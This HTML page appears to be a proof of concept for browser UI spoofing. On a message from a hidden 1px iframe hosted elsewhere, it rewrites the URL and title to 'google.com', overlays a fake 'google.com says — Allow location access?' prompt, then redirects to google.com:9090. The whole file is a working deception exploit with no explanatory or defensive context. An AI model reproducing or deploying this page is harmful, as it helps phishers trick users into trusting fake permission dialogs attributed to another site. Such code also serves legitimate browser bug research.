<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Trusted Page</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
#spoof {
  display:none;
  position:fixed;
  inset:0;
  background:#fff;
  z-index:9999;
  font-family:-apple-system;
  padding:40px;
}
</style>
</head>

<body>
<h1>Origin A</h1>

<iframe
  src="https://cnfdnfial-ops.github.io/spoof/originB.html"
  sandbox="allow-scripts"
  style="width:1px;height:1px;border:0">
</iframe>

<div id="spoof">
  <h2>google.com says</h2>
  <p>Allow location access?</p>
  <button>Allow</button>
</div>

<script>
window.addEventListener("message", e => {
  if (e.data === "trigger-spoof") {
    history.pushState({}, "", "/trusted");
    document.title = "google.com";
    document.getElementById("spoof").style.display = "block";

    setTimeout(() => {
      location.href = "https://google.com:9090";
    }, 120);
  }
});
</script>
</body>
</html>
